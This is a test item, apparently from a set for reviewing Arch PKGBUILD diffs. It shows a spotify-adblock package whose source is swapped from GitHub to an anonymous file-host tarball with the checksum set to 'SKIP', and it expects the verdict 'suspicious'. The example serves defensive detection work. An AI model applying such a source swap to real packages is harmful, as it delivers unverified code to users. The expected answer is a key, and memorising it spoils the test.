@@ -1,0 +1,9 @@
+{
+ "id": "pkg-source-swap-skip",
+ "category": "pkgbuild",
+ "task": "review-pkgbuild",
+ "input": "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -8,8 +8,8 @@\n pkgname=spotify-adblock\n-pkgver=1.0.3\n+pkgver=1.0.4\n url=\"https://github.com/abba23/spotify-adblock\"\n-source=(\"$pkgname-$pkgver.tar.gz::https://github.com/abba23/spotify-adblock/archive/v$pkgver.tar.gz\")\n-sha256sums=('5c3c4e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d')\n+source=(\"$pkgname-$pkgver.tar.gz::https://files.catbox.moe/x7k2qa.tar.gz\")\n+sha256sums=('SKIP')",
+ "expect": {
+  "verdict": "suspicious"
+ }
+}
